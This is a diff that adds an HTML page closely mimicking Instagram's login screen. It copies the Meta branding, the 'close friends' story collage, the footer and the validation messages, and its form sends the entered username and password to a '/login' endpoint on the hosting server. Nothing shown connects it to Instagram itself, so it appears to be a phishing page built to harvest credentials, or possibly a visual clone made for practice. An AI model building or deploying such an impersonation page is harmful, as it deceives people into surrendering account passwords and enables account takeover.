@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<title>Instagram</title>
+<!-- Tailwind CSS v3 -->
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: {
+      extend: {
+        colors: {
+          brandDark: '#000000',
+          panelDark: '#121212',
+          borderDark: '#262626',
+          inputBorder: '#363636',
+          igBlue: '#0064e0',
+          igBlueHover: '#1877f2',
+          igBlueDisabled: '#183b6b',
+          igGrayText: '#8e8e8e',
+          igSecondaryText: '#a8a8a8',
+          subtleText: '#737373',
+        },
+        fontFamily: {
+          sans: [
+            '-apple-system', 'BlinkMacSystemFont', '"Segoe UI"',
+            'Roboto', 'Helvetica', 'Arial', 'sans-serif'
+          ]
+        }
+      }
+    }
+  };
+</script>
+<style data-purpose="custom-gradients">
+  .ig-text-gradient {
+    background: linear-gradient(90deg, #fd5949 0%, #d6249f 60%, #285AEB 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .ig-highlight-gradient {
+    background: linear-gradient(90deg, #ff5e3a 0%, #ff2a6d 50%, #9013fe 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .close-friends-gradient {
+    background: linear-gradient(90deg, #ff5364 0%, #e0329b 50%, #b429d2 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+</style>
+<style data-purpose="card-rotations">
+  .story-left {
+    transform: rotate(-10deg) translateY(18px);
+  }
+  .story-right {
+    transform: rotate(11deg) translateY(24px);
+  }
+  .story-center {
+    transform: rotate(0deg);
+    box-shadow: 0 15px 40px -10px rgba(0, 0, 0, 0.85);
+  }
+  .reaction-bubble {
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+  }
+  input:-webkit-autofill,
+  input:-webkit-autofill:hover,
+  input:-webkit-autofill:focus {
+    -webkit-text-fill-color: #ffffff;
+    -webkit-box-shadow: 0 0 0px 1000px #121212 inset;
+    transition: background-color 5000s ease-in-out 0s;
+  }
+</style>
+</head>
+<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-neutral-800 antialiased font-sans">
+
+<!-- BEGIN: MobileBrandHeader (mobile / tablet only) -->
+<header class="lg:hidden flex flex-col items-center text-center pt-8 pb-1 px-5" data-purpose="mobile-brand-header">
+  <a aria-label="Instagram" class="mb-4 transition-transform active:scale-95 duration-150" href="/">
+    <svg class="w-14 h-14" fill="none" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <lineargradient id="ig-camera-gradient-mobile" x1="10%" x2="90%" y1="100%" y2="0%">
+          <stop offset="0%" stop-color="#ffd521"></stop>
+          <stop offset="25%" stop-color="#f50000"></stop>
+          <stop offset="65%" stop-color="#c13584"></stop>
+          <stop offset="100%" stop-color="#833ab4"></stop>
+        </lineargradient>
+      </defs>
+      <rect height="19" rx="5.5" stroke="url(#ig-camera-gradient-mobile)" stroke-width="2.1" width="19" x="2.5" y="2.5"></rect>
+      <circle cx="12" cy="12" r="4.2" stroke="url(#ig-camera-gradient-mobile)" stroke-width="2.1"></circle>
+      <circle cx="17.6" cy="6.4" fill="url(#ig-camera-gradient-mobile)" r="1.2"></circle>
+    </svg>
+  </a>
+  <h1 class="text-xl font-bold tracking-tight text-white px-4 leading-snug">
+    See everyday moments from your <span class="close-friends-gradient font-extrabold">close friends</span>.
+  </h1>
+</header>
+<!-- END: MobileBrandHeader -->
+
+<main class="flex-grow flex flex-col lg:flex-row w-full max-w-[1920px] mx-auto min-h-[calc(100vh-100px)]">
+
+  <!-- BEGIN: HeroPresentationSection (desktop only) -->
+  <section class="hidden lg:flex flex-1 flex-col justify-between px-8 sm:px-14 lg:px-20 py-8 lg:py-12 relative overflow-hidden" data-purpose="hero-presentation">
+
+    <!-- Instagram Logo in top-left -->
+    <div class="mb-4 sm:mb-8" data-purpose="brand-logo">
+      <a aria-label="Instagram" class="inline-block transition-opacity hover:opacity-90" href="/">
+        <svg class="w-12 h-12" fill="none" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <lineargradient id="ig-camera-gradient-desktop" x1="10%" x2="90%" y1="100%" y2="0%">
+              <stop offset="0%" stop-color="#ffd521"></stop>
+              <stop offset="25%" stop-color="#f50000"></stop>
+              <stop offset="65%" stop-color="#c13584"></stop>
+              <stop offset="100%" stop-color="#833ab4"></stop>
+            </lineargradient>
+          </defs>
+          <rect height="19" rx="5.5" stroke="url(#ig-camera-gradient-desktop)" stroke-width="2.1" width="19" x="2.5" y="2.5"></rect>
+          <circle cx="12" cy="12" r="4.2" stroke="url(#ig-camera-gradient-desktop)" stroke-width="2.1"></circle>
+          <circle cx="17.6" cy="6.4" fill="url(#ig-camera-gradient-desktop)" r="1.2"></circle>
+        </svg>
+      </a>
+    </div>
+
+    <!-- Center Headline and Floating Stories Collage -->
+    <div class="flex flex-col items-center justify-center my-auto w-full max-w-2xl mx-auto text-center" data-purpose="collage-wrapper">
+      <h1 class="text-3xl sm:text-4xl lg:text-[42px] leading-tight font-medium tracking-tight mb-12 sm:mb-16 max-w-xl text-white">
+        See everyday moments from your <span class="ig-highlight-gradient font-semibold">close friends</span>.
+      </h1>
+
+      <div class="relative w-[340px] sm:w-[420px] h-[370px] sm:h-[430px] flex items-center justify-center select-none" data-purpose="stories-collage">
+        <!-- Reaction Emoji Floating Pill -->
+        <div class="absolute -top-3 left-6 sm:left-12 z-30 bg-neutral-900/95 backdrop-blur-md rounded-full px-3.5 py-1.5 flex items-center gap-2 border border-neutral-700/60 reaction-bubble scale-90 sm:scale-100">
+          <span class="text-xl leading-none">🔮</span>
+          <span class="text-xl leading-none">👀</span>
+          <span class="text-xl leading-none">🤯</span>
+        </div>
+
+        <!-- Left Card -->
+        <div class="story-left absolute left-1 sm:left-4 z-10 w-[170px] sm:w-[200px] h-[270px] sm:h-[320px] rounded-3xl overflow-hidden border-[3px] border-neutral-800 bg-neutral-900 shadow-2xl origin-bottom">
+          <div class="w-full h-full relative overflow-hidden bg-neutral-900">
+            <img alt="Friend posing outdoor" class="w-full h-full object-cover brightness-90" src="/assets/story-left.jpg">
+            <div class="absolute top-2.5 inset-x-3 h-[2px] bg-white/40 rounded-full overflow-hidden">
+              <div class="w-full h-full bg-white"></div>
+            </div>
+            <div class="absolute bottom-3 inset-x-3.5 h-6 rounded-full border border-white/60 backdrop-blur-sm"></div>
+          </div>
+        </div>
+
+        <!-- Right Card -->
+        <div class="story-right absolute right-1 sm:right-4 z-10 w-[170px] sm:w-[200px] h-[270px] sm:h-[320px] rounded-3xl overflow-hidden border-[3px] border-neutral-800 bg-neutral-900 shadow-2xl origin-bottom">
+          <div class="w-full h-full relative overflow-hidden bg-neutral-900">
+            <img alt="Friends outdoor smiling" class="w-full h-full object-cover brightness-90" src="/assets/story-right.jpg">
+            <div class="absolute top-2.5 inset-x-3 h-[2px] bg-white/40 rounded-full overflow-hidden">
+              <div class="w-2/3 h-full bg-white"></div>
+            </div>
+            <div class="absolute bottom-3 right-3 text-white/90">
+              <svg class="w-5 h-5 fill-current" viewbox="0 0 24 24">
+                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"></path>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <!-- Center Focus Card -->
+        <div class="story-center relative z-20 w-[190px] sm:w-[225px] h-[310px] sm:h-[370px] rounded-[28px] overflow-hidden border-[3px] border-neutral-700/80 bg-neutral-900">
+          <div class="w-full h-full relative overflow-hidden">
+            <img alt="Close friends selfie smiling together" class="w-full h-full object-cover" src="/assets/story-center.jpg">
+            <div class="absolute top-3 inset-x-3 flex gap-1 z-30">
+              <div class="flex-1 h-[2.5px] bg-white rounded-full"></div>
+              <div class="flex-1 h-[2.5px] bg-white/40 rounded-full"></div>
+              <div class="flex-1 h-[2.5px] bg-white/40 rounded-full"></div>
+            </div>
+            <div class="absolute bottom-3.5 inset-x-3 flex items-center justify-between gap-2 z-30">
+              <div class="flex-1 h-7 rounded-full border border-white/80 bg-black/20 backdrop-blur-[2px] px-3 flex items-center">
+                <span class="text-[10px] text-white/60">Send message</span>
+              </div>
+              <button aria-label="Like story" class="text-white hover:scale-110 transition-transform" type="button">
+                <svg class="w-5 h-5 stroke-[2] stroke-white fill-none" viewbox="0 0 24 24">
+                  <path d="M21 8.25c0-2.485-2.099-4.5-4.688-4.5-1.935 0-3.597 1.126-4.312 2.733-.715-1.607-2.377-2.733-4.313-2.733C5.1 3.75 3 5.765 3 8.25c0 7.22 9 12 9 12s9-4.78 9-12z" stroke-linecap="round" stroke-linejoin="round"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Close Friends Green Star Badge -->
+        <div class="absolute right-4 sm:right-9 top-1/3 z-30 transform translate-x-2 -translate-y-2">
+          <div class="bg-[#10b981] text-white px-2.5 py-1 rounded-full flex items-center gap-1 shadow-lg shadow-black/50 border border-black/30">
+            <svg class="w-3.5 h-3.5 fill-white" viewbox="0 0 24 24">
+              <path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path>
+            </svg>
+            <svg class="w-3 h-3 stroke-[2.5] stroke-white fill-none" viewbox="0 0 24 24">
+              <path d="M19.5 8.25l-7.5 7.5-7.5-7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Floating Gradient Profile Avatar Badge -->
+        <div class="absolute -bottom-2 right-6 sm:right-10 z-30">
+          <div class="w-12 h-12 rounded-full p-[2.5px] bg-gradient-to-tr from-[#f09433] via-[#dc2743] to-[#bc1888] shadow-xl">
+            <img alt="Profile Story Ring" class="w-full h-full object-cover rounded-full border-2 border-black" src="/assets/avatar.jpg">
+          </div>
+        </div>
+
+        <!-- Floating Heart -->
+        <div class="absolute -bottom-2 left-5 sm:left-10 z-30">
+          <div class="w-11 h-11 rounded-full bg-gradient-to-tr from-[#ff385c] to-[#d6249f] flex items-center justify-center shadow-lg shadow-pink-950/60 border border-white/10">
+            <svg class="w-6 h-6 fill-white" viewbox="0 0 24 24">
+              <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="hidden lg:block h-8"></div>
+  </section>
+  <!-- END: HeroPresentationSection -->
+
+  <!-- Vertical Separation Line -->
+  <div class="hidden lg:block w-[1px] bg-neutral-800 self-stretch my-6"></div>
+
+  <!-- BEGIN: LoginSection -->
+  <section class="flex-1 flex flex-col justify-center items-center lg:items-start px-6 sm:px-12 lg:pl-16 lg:pr-24 py-12" data-purpose="login-authentication">
+    <div class="w-full max-w-[390px] mx-auto lg:mx-0 flex flex-col">
+      <h2 class="text-xl font-medium text-white mb-6 tracking-tight">Log into Instagram</h2>
+
+      <!-- Error banner (populated from ?error= or client-side validation) -->
+      <div id="error-banner" class="hidden mb-4 w-full rounded-xl border border-red-900/60 bg-red-950/30 px-4 py-3 text-sm text-red-300" role="alert"></div>
+
+      <!-- Authentication Form -->
+      <form action="/login" method="POST" class="w-full flex flex-col gap-3" data-purpose="login-form" id="login-form" novalidate>
+        <div class="relative">
+          <input
+            class="w-full bg-[#121212] hover:bg-[#161616] focus:bg-[#121212] border border-[#2b2b2b] focus:border-[#525252] focus:ring-0 text-[13px] text-white placeholder-neutral-500 rounded-xl px-4 py-3.5 transition-colors outline-none"
+            id="username-field" name="username" placeholder="Mobile number, username or email"
+            type="text" autocomplete="username" autocapitalize="none">
+        </div>
+        <div class="relative">
+          <input
+            class="w-full bg-[#121212] hover:bg-[#161616] focus:bg-[#121212] border border-[#2b2b2b] focus:border-[#525252] focus:ring-0 text-[13px] text-white placeholder-neutral-500 rounded-xl px-4 py-3.5 pr-16 transition-colors outline-none"
+            id="password-field" name="password" placeholder="Password"
+            type="password" autocomplete="current-password">
+          <button class="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-neutral-400 hover:text-white transition-colors select-none py-1 px-1" id="toggle-password-btn" type="button">
+            Show
+          </button>
+        </div>
+        <button
+          class="w-full mt-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-medium py-2.5 rounded-full text-sm transition-opacity duration-150 active:opacity-90 flex items-center justify-center tracking-wide"
+          id="login-submit-btn" type="submit">
+          Log in
+        </button>
+      </form>
+
+      <div class="text-center my-4">
+        <a class="text-xs font-normal text-white/90 hover:underline" href="#">Forgot password?</a>
+      </div>
+
+      <div class="flex flex-col gap-3 mt-4" data-purpose="secondary-actions">
+        <button class="w-full flex items-center justify-center gap-2.5 py-2.5 px-4 rounded-full bg-[#1f1f1f] hover:bg-[#2a2a2a] text-white text-sm font-medium transition-colors" type="button">
+          <svg class="w-4 h-4 fill-[#1877f2]" viewbox="0 0 24 24">
+            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path>
+          </svg>
+          <span>Log in with Facebook</span>
+        </button>
+        <button class="w-full py-2.5 px-4 rounded-full border border-[#0064e0] text-[#0064e0] hover:bg-[#0064e0]/10 text-sm font-medium transition-colors text-center" type="button">
+          Create new account
+        </button>
+      </div>
+
+      <div class="flex justify-center items-center gap-1.5 mt-10 text-neutral-400" data-purpose="meta-brand-badge">
+        <svg class="w-4 h-4 fill-current text-white/70" viewbox="0 0 24 24">
+          <path d="M12 11.23c-1.25-1.93-2.61-3.23-4.14-3.23C5.39 8 3.5 10.22 3.5 13.5c0 3.25 1.86 5.5 4.36 5.5 1.56 0 2.92-1.32 4.14-3.24 1.22 1.92 2.58 3.24 4.14 3.24 2.5 0 4.36-2.25 4.36-5.5 0-3.28-1.89-5.5-4.36-5.5-1.53 0-2.89 1.3-4.14 3.23zm0 2.37c-.89 1.6-1.92 2.85-2.97 2.85-1.27 0-2.36-1.3-2.36-3.95 0-2.67 1.09-3.95 2.36-3.95 1.05 0 2.08 1.25 2.97 2.85v2.2zm2.97 2.85c-1.05 0-2.08-1.25-2.97-2.85v-2.2c.89-1.6 1.92-2.85 2.97-2.85 1.27 0 2.36 1.28 2.36 3.95 0 2.65-1.09 3.95-2.36 3.95z"></path>
+        </svg>
+        <span class="text-sm font-semibold tracking-wide text-white/70">Meta</span>
+      </div>
+    </div>
+  </section>
+  <!-- END: LoginSection -->
+</main>
+
+<!-- BEGIN: MainFooter -->
+<footer class="w-full py-6 px-6 border-t border-neutral-900 text-xs text-neutral-500 flex flex-col items-center gap-3.5" data-purpose="global-footer">
+  <!-- Full directory (desktop) -->
+  <nav aria-label="Footer directory" class="hidden lg:flex flex-wrap justify-center items-center gap-x-4 gap-y-1.5 text-[12px] max-w-5xl mx-auto">
+    <a class="hover:underline" href="#">Meta</a>
+    <a class="hover:underline" href="#">About</a>
+    <a class="hover:underline" href="#">Blog</a>
+    <a class="hover:underline" href="#">Jobs</a>
+    <a class="hover:underline" href="#">Help</a>
+    <a class="hover:underline" href="#">API</a>
+    <a class="hover:underline" href="#">Privacy</a>
+    <a class="hover:underline" href="#">Terms</a>
+    <a class="hover:underline" href="#">Locations</a>
+    <a class="hover:underline" href="#">Instagram Lite</a>
+    <a class="hover:underline" href="#">Meta AI</a>
+    <a class="hover:underline" href="#">Muse</a>
+    <a class="hover:underline" href="#">Threads</a>
+    <a class="hover:underline" href="#">Contact Uploading &amp; Non-Users</a>
+    <a class="hover:underline" href="#">Meta Verified</a>
+  </nav>
+  <!-- Condensed directory (mobile) -->
+  <nav aria-label="Footer directory" class="lg:hidden flex flex-wrap justify-center gap-x-3 gap-y-1.5 text-[11px]">
+    <a class="hover:underline" href="#">About</a>
+    <a class="hover:underline" href="#">Help</a>
+    <a class="hover:underline" href="#">Privacy</a>
+    <a class="hover:underline" href="#">Terms</a>
+    <a class="hover:underline" href="#">Meta Verified</a>
+  </nav>
+  <div class="flex items-center gap-4 text-[12px] text-neutral-500">
+    <div class="relative inline-flex items-center gap-1 cursor-pointer hover:text-neutral-400">
+      <span>English</span>
+      <svg class="w-3.5 h-3.5 stroke-[2] stroke-current fill-none" viewbox="0 0 24 24">
+        <path d="M19.5 8.25l-7.5 7.5-7.5-7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+    </div>
+    <span>© 2026 Instagram from Meta</span>
+  </div>
+</footer>
+<!-- END: MainFooter -->
+
+<!-- BEGIN: InteractiveHandlers -->
+<script data-purpose="login-handlers">
+  (function () {
+    const userInput = document.getElementById('username-field');
+    const passInput = document.getElementById('password-field');
+    const submitBtn = document.getElementById('login-submit-btn');
+    const toggleBtn = document.getElementById('toggle-password-btn');
+    const form = document.getElementById('login-form');
+    const errorBanner = document.getElementById('error-banner');
+
+    // Button visual state (matches Instagram input behaviour)
+    function updateButtonState() {
+      const ready = userInput.value.trim().length > 0 && passInput.value.length >= 6;
+      submitBtn.style.opacity = ready ? '1' : '0.7';
+      submitBtn.style.cursor = ready ? 'pointer' : 'default';
+    }
+    userInput.addEventListener('input', updateButtonState);
+    passInput.addEventListener('input', updateButtonState);
+    updateButtonState();
+
+    // Password show / hide
+    toggleBtn.addEventListener('click', function () {
+      const isPassword = passInput.getAttribute('type') === 'password';
+      passInput.setAttribute('type', isPassword ? 'text' : 'password');
+      toggleBtn.textContent = isPassword ? 'Hide' : 'Show';
+    });
+
+    // Error banner helpers
+    const MESSAGES = {
+      missing: 'Enter a username and a password.',
+      short: 'Your password must be at least 6 characters long.'
+    };
+
+    function showError(msg) {
+      errorBanner.textContent = msg;
+      errorBanner.classList.remove('hidden');
+    }
+    function hideError() {
+      errorBanner.classList.add('hidden');
+    }
+
+    // Server-side validation errors come back as ?error=…
+    const params = new URLSearchParams(window.location.search);
+    const serverError = params.get('error');
+    if (serverError) {
+      showError(MESSAGES[serverError] || 'Something went wrong. Please try again.');
+      if (window.history && window.history.replaceState) {
+        window.history.replaceState({}, document.title, '/');
+      }
+    }
+
+    // Client-side validation (form uses novalidate)
+    form.addEventListener('submit', function (event) {
+      hideError();
+      const username = userInput.value.trim();
+      const password = passInput.value;
+
+      if (!username || !password) {
+        event.preventDefault();
+        showError(MESSAGES.missing);
+        userInput.focus();
+        return;
+      }
+      if (password.length < 6) {
+        event.preventDefault();
+        showError(MESSAGES.short);
+        passInput.focus();
+        return;
+      }
+      // Valid: allow the browser to POST to /login.
+      submitBtn.disabled = true;
+      submitBtn.style.opacity = '0.6';
+    });
+  })();
+</script>
+<!-- END: InteractiveHandlers -->
+</body>
+</html>
